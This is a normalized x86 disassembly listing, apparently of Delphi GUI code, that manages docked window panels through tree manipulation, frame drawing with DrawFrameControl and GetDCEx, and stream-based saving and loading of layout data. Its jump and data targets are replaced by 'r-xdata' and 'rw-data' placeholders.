mov ebx [ eax ]
call [ ebx + 0xc ]
xor eax eax
mov [ ebp - 0x18 ] eax
xor esi esi
inc edi
mov [ ebp - 0x1c ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44688a
mov eax [ ebp - 0x8 ]
call sub_445d78
retn
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_44554c
mov ebx eax
lea edx [ ebx + 0x10 ]
mov ecx 0x1
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
lea edx [ ebx + 0x20 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
push ebp
lea eax [ ebp - 0xc ]
call sub_446660
pop ecx
cmp [ ebp - 0xc ] 0x0
je r-xdata
inc [ ebp - 0x1c ]
dec edi
jne r-xdata
lea ecx [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
mov edx [ ebp - 0xc ]
mov si 0xffb9
call sub_403454
cmp [ ebp - 0x10 ] 0x0
je r-xdata
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_44586c
test al al
jne r-xdata
push ebp
lea eax [ ebp - 0xc ]
call sub_446660
pop ecx
cmp [ ebp - 0xc ] 0x0
je r-xdata
xor edx edx
mov eax [ ebp - 0x10 ]
call sub_43ce40
push 0x0
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x14 ]
xor ecx ecx
mov eax [ ebp - 0x10 ]
call sub_43dc20
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
jne r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0x64 ] ebx
jmp r-xdata
mov eax ebx
call sub_403258
jmp r-xdata
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
jle r-xdata
mov [ esi + 0xc ] ebx
mov [ ebx + 0x18 ] esi
mov eax [ esi + 0x14 ]
mov [ ebx + 0x14 ] eax
jmp r-xdata
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x18 ] eax
mov esi ebx
jmp r-xdata
lea edx [ ebp - 0x14 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ ebp - 0x14 ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
jge r-xdata
mov [ esi + 0x8 ] ebx
mov [ ebx + 0x14 ] esi
jmp r-xdata
mov eax esi
mov edi [ ebp - 0x18 ]
sub edi [ ebp - 0x14 ]
test edi edi
jle r-xdata
mov [ eax + 0xc ] ebx
mov [ ebx + 0x18 ] eax
mov eax [ eax + 0x14 ]
mov [ ebx + 0x14 ] eax
mov [ ebp - 0x1c ] 0x1
mov eax [ eax + 0x14 ]
inc [ ebp - 0x1c ]
dec edi
jne r-xdata
sub_4468b0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
push 0x0
push 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edi [ eax + 0x18 ]
mov eax edi
add eax esi
sub eax 0x2
push eax
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx edi
add ecx ebx
sub ecx 0x2
mov edx esi
mov eax ebx
call sub_412b10
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41dd2c
push eax
call DrawFrameControl
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_446908
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov edi eax
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx 0xff000014
call sub_41d304
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov ecx ebx
mov edx esi
call sub_41da60
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov ecx ebx
mov edx edi
call sub_41da00
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov edx edi
call sub_41da00
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx 0xff000010
call sub_41d304
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov edx esi
call sub_41da00
mov ecx ebx
dec ecx
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov edx esi
call sub_41da00
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_446990
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov ebx [ ebp + 0x8 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
mov al [ eax + 0x5b ]
dec eax
sub al 0x2
jae r-xdata
push ebp
mov eax [ ebx + 0x8 ]
mov edx [ ebp - 0x8 ]
sub eax [ edx + 0x18 ]
inc eax
mov edx [ ebx + 0x4 ]
inc edx
call sub_4468b0
pop ecx
push ebp
mov eax [ ebx + 0x4 ]
mov edx eax
add edx 0x5
push edx
mov ecx [ ebx + 0x8 ]
mov edx [ ebp - 0x8 ]
sub ecx [ edx + 0x18 ]
sub ecx 0x2
mov edx eax
add edx 0x3
mov eax [ ebx ]
add eax 0x2
call sub_446908
pop ecx
push ebp
mov eax [ ebx + 0x4 ]
mov edx eax
add edx 0x8
push edx
mov ecx [ ebx + 0x8 ]
mov edx [ ebp - 0x8 ]
sub ecx [ edx + 0x18 ]
sub ecx 0x2
mov edx eax
add edx 0x6
mov eax [ ebx ]
add eax 0x2
call sub_446908
pop ecx
push ebp
mov edx [ ebx + 0x4 ]
inc edx
mov eax [ ebx ]
inc eax
call sub_4468b0
pop ecx
push ebp
mov edx [ ebx + 0xc ]
sub edx 0x2
push edx
mov edx [ ebx + 0x4 ]
mov ecx [ ebp - 0x8 ]
add edx [ ecx + 0x18 ]
inc edx
mov eax [ ebx ]
mov ecx eax
add ecx 0x5
add eax 0x3
call sub_446908
pop ecx
push ebp
mov edx [ ebx + 0xc ]
sub edx 0x2
push edx
mov edx [ ebx + 0x4 ]
mov ecx [ ebp - 0x8 ]
add edx [ ecx + 0x18 ]
inc edx
mov eax [ ebx ]
mov ecx eax
add ecx 0x8
add eax 0x6
call sub_446908
pop ecx
jmp r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
sub_446a6c
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov ebx edx
mov esi eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41d734
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_446bc2
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ esi + 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_43bafc
mov eax [ ebp - 0x4 ]
call sub_41da38
xor eax eax
push ebp
push sub_446ba5
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41ddac
xor eax eax
push ebp
push sub_446b88
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi + 0x14 ]
call sub_440438
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_446b8f
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_41ddac
retn
inc eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x0
inc [ ebp - 0x8 ]
dec [ ebp - 0xc ]
jne r-xdata
mov eax [ ebx + 0xa0 ]
cmp eax [ esi + 0x14 ]
jne r-xdata
mov eax [ esi + 0x14 ]
mov edx [ ebp - 0x8 ]
call sub_4403fc
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_43c8c0
lea ecx [ ebp - 0x1c ]
mov edx ebx
mov eax esi
mov edi [ eax ]
call [ edi ]
mov eax [ ebp - 0x1c ]
sub eax [ ebx + 0x40 ]
add eax eax
sub [ ebp - 0x1c ] eax
mov eax [ ebp - 0x18 ]
sub eax [ ebx + 0x44 ]
add eax eax
sub [ ebp - 0x18 ] eax
mov eax [ ebx + 0x48 ]
mov edx [ ebp - 0x14 ]
sub edx [ ebp - 0x1c ]
sub eax edx
add eax eax
sub [ ebp - 0x14 ] eax
mov eax [ ebx + 0x4c ]
mov edx [ ebp - 0x10 ]
sub edx [ ebp - 0x18 ]
sub eax edx
add eax eax
sub [ ebp - 0x10 ] eax
lea eax [ ebp - 0x1c ]
push eax
mov ecx ebx
mov edx [ ebp - 0x4 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x10 ]
sub_446bd0
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov ebx ecx
mov esi eax
mov eax [ esi + 0x14 ]
call sub_442238
mov edi eax
test ebx ebx
je r-xdata
mov eax [ esi + 0x14 ]
call sub_43c968
push eax
lea eax [ ebp - 0x1c ]
push eax
mov eax [ esi + 0x14 ]
call sub_43c924
mov ecx eax
xor edx edx
xor eax eax
call sub_412b10
mov eax [ ebp + 0x8 ]
push esi
push edi
lea esi [ ebp - 0x1c ]
mov edi eax
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
test edi edi
jle r-xdata
cmp [ ebx + 0x9c ] 0x0
je r-xdata
push 0x2
mov eax [ ebp + 0x8 ]
push eax
push 0x0
mov eax [ esi + 0x14 ]
call sub_443708
push eax
call MapWindowPoints
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov al [ ebp + 0xc ]
dec al
je r-xdata
cmp edi 0x2
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
sar eax 0x1
jns r-xdata
dec al
je r-xdata
mov eax [ ebx + 0x40 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebx + 0x44 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x48 ]
mov edi eax
mov edx [ ebx + 0x4c ]
mov [ ebp - 0xc ] edx
mov dl [ ebp + 0xc ]
add dl 0xfd
sub dl 0x2
jae r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
sar eax 0x1
jns r-xdata
dec al
je r-xdata
mov al [ ebp + 0xc ]
dec eax
sub al 0x2
jae r-xdata
mov edi eax
sar edi 0x1
jns r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx + 0x4 ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
sar eax 0x1
jns r-xdata
dec al
je r-xdata
mov al [ ebp + 0xc ]
sub al 0x2
je r-xdata
mov eax [ ebx + 0x4c ]
sar eax 0x1
jns r-xdata
adc edi 0x0
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx + 0x8 ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
sar eax 0x1
jns r-xdata
jmp r-xdata
mov eax [ ebp - 0xc ]
add [ ebp - 0x8 ] eax
sub al 0x2
jne r-xdata
mov [ ebp - 0xc ] eax
adc eax 0x0
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x1c ]
push eax
mov ecx edi
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_412b38
mov eax [ ebp + 0x8 ]
push esi
lea esi [ ebp - 0x1c ]
mov edi eax
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
add [ ebp - 0x4 ] edi
jmp r-xdata
sub_446d44
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
call sub_446d44
pop ecx
mov eax ebx
call sub_403258
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
push edx
call sub_446d44
pop ecx
sub_446d78
push ebp
mov ebp esp
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
pop esi
pop ebx
pop ebp
retn
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax [ ebx + 0x18 ]
test eax eax
je r-xdata
push ebp
call sub_446d44
pop ecx
mov eax [ ebx + 0x14 ]
test eax eax
je r-xdata
mov edx [ ebx + 0xc ]
mov [ eax + 0xc ] edx
jmp r-xdata
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov edx [ ebx + 0xc ]
mov [ eax + 0x8 ] edx
cmp ebx [ esi + 0x64 ]
jne r-xdata
mov edx [ ebx + 0x18 ]
mov [ eax + 0x18 ] edx
mov eax ebx
call sub_403258
xor eax eax
mov [ esi + 0x64 ] eax
sub_446dd4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_445de4
test eax eax
je r-xdata
pop esi
pop ebx
retn
cmp eax [ ebx + 0x38 ]
jne r-xdata
mov edx eax
mov eax ebx
call sub_446e10
xor edx edx
mov [ eax + 0x4 ] edx
jmp r-xdata
mov [ esi + 0x9c ] 0x0
mov eax [ ebx + 0x14 ]
mov edx [ eax ]
call [ edx + 0x7c ]
sub_446e10
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_44707d
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
jne r-xdata
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405b88
lea eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405b88
mov edx [ ebp - 0x8 ]
pop eax
call sub_404270
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6f8
call sub_4039e4
mov eax [ ebx + 0x14 ]
call sub_445570
cmp eax 0x1
jne r-xdata
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405b88
lea eax [ ebp - 0xc ]
push eax
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405b88
mov edx [ ebp - 0x10 ]
pop eax
call sub_404270
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6f8
call sub_4039e4
cmp eax 0x2
jne r-xdata
mov eax [ esi + 0x64 ]
xor edx edx
mov [ eax + 0x8 ] edx
mov [ eax + 0x10 ] 0x0
jmp r-xdata
mov eax [ ebx + 0x18 ]
test eax eax
jne r-xdata
mov eax [ ebx + 0x18 ]
test eax eax
jne r-xdata
mov eax ebx
call sub_403258
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_447084
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_403fcc
retn
mov edx [ ebx + 0xc ]
mov [ eax + 0xc ] edx
mov edx [ ebx + 0xc ]
test edx edx
je r-xdata
mov eax [ ebx + 0x14 ]
mov edx [ ebx + 0xc ]
mov [ eax + 0x8 ] edx
mov eax [ ebx + 0xc ]
xor edx edx
mov [ eax + 0x18 ] edx
call sub_445920
jmp r-xdata
mov edi eax
mov edi [ ebx + 0xc ]
jmp r-xdata
mov eax ebx
call sub_445a98
mov edx eax
mov eax [ ebx + 0x18 ]
call sub_445ad4
mov eax [ ebx + 0x18 ]
call sub_445920
mov [ edx + 0x18 ] eax
push esi
push sub_447620
mov edx [ ebx + 0x14 ]
mov eax esi
call sub_445e4c
mov eax [ ebx + 0x14 ]
cmp eax [ esi + 0x64 ]
jne r-xdata
mov edx [ esi + 0x64 ]
mov eax [ ebx + 0x14 ]
cmp edx eax
jne r-xdata
cmp [ edi + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x14 ]
mov eax [ eax + 0x18 ]
mov edx [ edi + 0x8 ]
mov [ edx + 0x18 ] eax
test eax eax
jne r-xdata
mov edx [ esi + 0x68 ]
mov eax edi
call sub_445ad4
mov eax [ esi + 0x64 ]
call sub_445a98
mov [ esi + 0x68 ] eax
mov eax [ esi + 0x64 ]
call sub_403258
mov [ esi + 0x64 ] edi
xor eax eax
mov [ edi + 0xc ] eax
xor eax eax
mov [ edi + 0x18 ] eax
xor eax eax
mov [ edi + 0x14 ] eax
mov eax esi
call sub_4475f8
jmp r-xdata
mov [ eax + 0x10 ] 0x0
mov edx [ edi + 0x4 ]
mov [ eax + 0x4 ] edx
xor edx edx
mov [ eax + 0x8 ] edx
mov eax edi
call sub_403258
mov eax [ esi + 0x64 ]
mov [ eax + 0x8 ] edi
xor eax eax
mov [ edi + 0x18 ] eax
xor eax eax
mov [ edi + 0xc ] eax
mov eax [ esi + 0x64 ]
call sub_44561c
mov edx eax
mov eax edi
call sub_445ac0
mov eax edi
call sub_445920
jmp r-xdata
mov edx [ edi + 0x8 ]
mov [ eax + 0xc ] edx
mov eax [ edi + 0x8 ]
mov edx [ ebx + 0x14 ]
mov edx [ edx + 0x14 ]
mov [ edx + 0x8 ] eax
jmp r-xdata
push esi
push sub_447620
mov edx [ ebx + 0x14 ]
mov eax esi
call sub_445e4c
jmp r-xdata
mov eax [ eax + 0xc ]
mov edx [ ebx + 0x14 ]
mov edx [ edx + 0x14 ]
mov [ eax + 0x14 ] edx
cmp [ eax + 0xc ] 0x0
jne r-xdata
mov edx [ ebx + 0x14 ]
mov edx [ edx + 0xc ]
mov [ eax + 0xc ] edx
cmp [ eax + 0xc ] 0x0
je r-xdata
mov eax [ edi + 0x8 ]
mov edx [ ebx + 0x14 ]
mov edx [ edx + 0x14 ]
mov [ eax + 0x14 ] edx
push esi
push sub_447620
mov edx [ eax + 0x14 ]
mov eax esi
call sub_445e4c
mov eax [ ebx + 0x14 ]
call sub_403258
mov eax edi
call sub_403258
jmp r-xdata
mov edx [ eax + 0xc ]
mov [ edx + 0x18 ] eax
sub_44708c
push ebx
push esi
push edi
add esp 0xfffffff0
mov ebx edx
mov edi eax
mov esi [ edi + 0x14 ]
test [ esi + 0x1c ] 0x1
jne r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
cmp [ edi + 0x64 ] 0x0
je r-xdata
mov eax esi
call sub_442238
test eax eax
jle r-xdata
mov edx esp
mov eax [ edi + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov edx esp
mov eax [ edi + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
test bl bl
jne r-xdata
push edi
lea esi [ esp + 0x4 ]
add edi 0x1d
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
mov eax [ edi + 0x64 ]
mov dl [ eax + 0x10 ]
dec dl
je r-xdata
lea edx [ edi + 0x1d ]
mov eax esp
mov ecx 0x10
call sub_407ca8
test al al
jne r-xdata
mov edx [ esp + 0x8 ]
sub edx [ esp ]
call sub_445ac0
mov eax [ esp + 0xc ]
sub eax [ esp + 0x4 ]
mov [ edi + 0x68 ] eax
jmp r-xdata
dec dl
je r-xdata
mov eax [ edi + 0x14 ]
call sub_4421a4
test eax eax
jle r-xdata
mov edx [ esp + 0xc ]
sub edx [ esp + 0x4 ]
call sub_445ac0
mov eax [ esp + 0x8 ]
sub eax [ esp ]
mov [ edi + 0x68 ] eax
jmp r-xdata
xor edx edx
mov eax edi
call sub_4474a8
cmp [ edi + 0x6c ] 0x0
jne r-xdata
push edi
push sub_447620
xor edx edx
mov eax edi
call sub_445e4c
sub_447168
push ebx
push esi
push ecx
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
pop edx
pop esi
pop ebx
retn
test ebx ebx
je r-xdata
mov eax [ ebx + 0x14 ]
mov al [ eax + 0x10 ]
cmp al [ esi + 0x48 ]
jne r-xdata
mov eax ebx
call sub_445a98
mov [ esp ] eax
fild [ esp ]
fmul [ esi + 0x40 ]
call sub_402a5c
mov edx eax
mov eax ebx
call sub_445ac0
sub_4471a4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_404458
xor eax eax
push ebp
push sub_44720f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_404268
mov [ ebp - 0x8 ] eax
lea edx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
mov ebx [ eax ]
call [ ebx + 0x10 ]
cmp [ ebp - 0x8 ] 0x0
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_447216
lea eax [ ebp - 0x4 ]
call sub_403fa8
retn
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
sub_44721c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_4472cb
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
mov esi [ eax ]
call [ esi + 0x10 ]
lea edx [ ebx + 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x1
mov esi [ eax ]
call [ esi + 0x10 ]
lea edx [ ebx + 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
mov esi [ eax ]
call [ esi + 0x10 ]
mov eax [ ebp + 0x8 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_445828
mov eax [ ebp - 0x8 ]
call sub_4471a4
pop ecx
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
mov edx [ ebp - 0x4 ]
inc edx
call sub_44721c
pop ecx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4472d2
lea eax [ ebp - 0x8 ]
call sub_403fa8
retn
mov edx [ ebp + 0x8 ]
push edx
mov edx [ ebp - 0x4 ]
call sub_44721c
pop ecx
sub_4472d8
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_447411
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
lea edx [ eax + 0x70 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_403228
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_4473c0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
call sub_4421a4
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x10 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov [ ebp - 0xc ] eax
lea edx [ ebp - 0xc ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov ebx [ ebp - 0xc ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4473c7
mov eax [ ebp - 0x10 ]
call sub_403258
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
cmp [ edi + 0x8 ] 0x0
je r-xdata
push ebp
lea ecx [ ebp - 0x14 ]
mov edx esi
mov eax [ ebp - 0x10 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x14 ]
call sub_4471a4
pop ecx
inc esi
dec ebx
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
mov edx esi
call sub_4421b8
mov edi eax
cmp [ edi + 0x57 ] 0x0
jne r-xdata
mov edx [ edi + 0x8 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
sub_4473c7
mov eax [ ebp - 0x8 ]
lea edx [ eax + 0x68 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
push ebp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x64 ]
xor edx edx
call sub_44721c
pop ecx
mov edx rw-data
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_447418
lea eax [ ebp - 0x14 ]
call sub_403fa8
retn
sub_447420
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
test ebx ebx
je r-xdata
pop esi
pop ebx
pop ebp
retn
mov eax ebx
call sub_445b70
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_445b98
call sub_447420
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_445b70
call sub_447420
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp ebx [ eax + 0x64 ]
je r-xdata
mov eax ebx
call sub_4455a0
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x64 ]
mov esi [ ebx + 0x14 ]
cmp eax esi
jne r-xdata
mov eax [ esi + 0x14 ]
call sub_445a98
mov edx eax
mov eax ebx
call sub_445ac0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax + 0x68 ]
mov eax ebx
call sub_445ac0
jmp r-xdata
sub_4474a8
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
test edx edx
jne r-xdata
push ebp
mov eax edx
call sub_447420
pop ecx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov edx [ eax ]
call [ edx + 0x7c ]
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x64 ]
mov edx [ eax + 0x8 ]
sub_4474ec
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
cmp ebx [ esi + 0x64 ]
je r-xdata
mov eax [ ebx + 0x14 ]
mov al [ eax + 0x10 ]
cmp al [ esi + 0x48 ]
jne r-xdata
mov eax ebx
call sub_445a98
mov edx eax
add edx [ esi + 0x4c ]
mov eax ebx
call sub_445ac0
sub_44751c
push ebx
push esi
push edi
add esp 0xfffffff8
mov esi ecx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
mov [ ebx + 0x60 ] edx
mov eax [ ebx + 0x14 ]
call sub_443708
mov edx eax
mov eax [ rw-data ]
call sub_44807c
mov eax [ ebx + 0x14 ]
call sub_443708
mov esi eax
mov [ ebx + 0x5c ] esi
push 0x412
push 0x0
push esi
call GetDCEx
mov [ ebx + 0x58 ] eax
mov eax [ esp ]
mov [ ebx + 0x50 ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x54 ] eax
mov eax ebx
call sub_447630
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_44757c
push ebx
mov ebx eax
xor edx edx
mov eax [ rw-data ]
call sub_44807c
mov eax ebx
call sub_447630
mov eax [ ebx + 0x58 ]
push eax
mov eax [ ebx + 0x5c ]
push eax
call ReleaseDC
mov eax [ ebx + 0x60 ]
mov edx [ eax + 0x14 ]
cmp [ edx + 0x10 ] 0x1
jne r-xdata
mov edx [ ebx + 0xc ]
sar edx 0x1
jns r-xdata
mov edx [ ebx + 0xc ]
sar edx 0x1
jns r-xdata
add edx [ ebx + 0x50 ]
call sub_445ac0
adc edx 0x0
add edx [ ebx + 0x54 ]
call sub_445ac0
jmp r-xdata
adc edx 0x0
mov eax [ ebx + 0x60 ]
mov edx [ eax + 0x14 ]
mov eax ebx
call sub_4474a8
push ebx
push sub_447620
mov eax [ ebx + 0x60 ]
mov edx [ eax + 0x14 ]
mov eax ebx
call sub_445e4c
xor eax eax
mov [ ebx + 0x60 ] eax
pop ebx
retn
sub_4475f8
push ebx
mov ebx eax
cmp [ ebx + 0x6c ] 0x0
jne r-xdata
pop ebx
retn
mov eax [ ebx + 0x14 ]
call sub_4421a4
test eax eax
jle r-xdata
push ebx
push sub_447620
xor edx edx
mov eax ebx
call sub_445e4c
sub_447630
push ebx
push esi
add esp 0xfffffff0
mov ebx eax
mov esi [ ebx + 0x60 ]
test esi esi
je r-xdata
add esp 0x10
pop esi
pop ebx
retn
mov eax [ esi + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax [ ebx + 0xc ]
sar eax 0x1
jns r-xdata
mov edx 0x2
mov eax esi
call sub_445664
mov [ esp ] eax
mov eax [ ebx + 0xc ]
sar eax 0x1
jns r-xdata
